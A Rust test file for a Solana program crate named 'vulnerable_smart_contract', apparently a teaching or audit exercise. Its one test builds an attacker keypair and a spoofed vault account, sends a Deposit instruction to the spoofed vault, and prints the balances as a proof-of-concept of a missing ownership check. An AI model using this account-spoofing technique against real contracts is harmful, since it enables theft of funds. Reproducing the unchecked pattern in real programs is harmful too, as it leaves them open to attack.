use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::system_program;
use solana_program_test::*;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use vulnerable_smart_contract::{Vault, VaultInstruction};

fn program_id() -> Pubkey {
    "Vu11111111111111111111111111111111111111111"
        .parse()
        .unwrap()
}

fn make_vault_account(authority: &Pubkey, balance: u64, owner: &Pubkey) -> Account {
    let vault_data = Vault {
        authority: *authority,
        balance,
    };
    let mut data = vec![0u8; Vault::SIZE];
    vault_data.serialize(&mut data.as_mut_slice()).unwrap();

    Account {
        lamports: balance + 1_000_000,
        data,
        owner: *owner,
        executable: false,
        rent_epoch: 0,
    }
}

#[tokio::test]
async fn test_missing_ownership_check() {
    let program_id = program_id();
    let mut program_test = ProgramTest::new(
        "vulnerable_smart_contract",
        program_id,
        processor!(vulnerable_smart_contract::process_instruction),
    );

    let attacker = Keypair::new();
    let fake_vault = Keypair::new();

    program_test.add_account(
        fake_vault.pubkey(),
        make_vault_account(
            &attacker.pubkey(),
            0, //-> fake vault balance is 0
            &program_id,
        ),
    );

    program_test.add_account(
        attacker.pubkey(),
        Account {
            lamports: 5_000_000,
            data: vec![],
            owner: system_program::id(),
            executable: false,
            rent_epoch: 0,
        },
    );

    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;

    // Transfer lamports to fake vault
    let deposit_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(fake_vault.pubkey(), false), // ← sahte vault
            AccountMeta::new(attacker.pubkey(), true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: VaultInstruction::Deposit { amount: 1_000_000 }
            .try_to_vec()
            .unwrap(),
    };

    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&payer.pubkey()),
        &[&payer, &attacker],
        recent_blockhash,
    );

    let result = banks_client.process_transaction(tx).await;

    assert!(result.is_ok(), "Crash: {:?}", result);

    let fake_vault_account = banks_client
        .get_account(fake_vault.pubkey())
        .await
        .unwrap()
        .unwrap();

    let attacker_balance = banks_client
        .get_account(attacker.pubkey())
        .await
        .unwrap()
        .unwrap();

    let vault_data = Vault::try_from_slice(&fake_vault_account.data).unwrap();

    println!("attacker balance: {}", attacker_balance.lamports);
    println!("fake_vault.balance: {}", vault_data.balance);
}
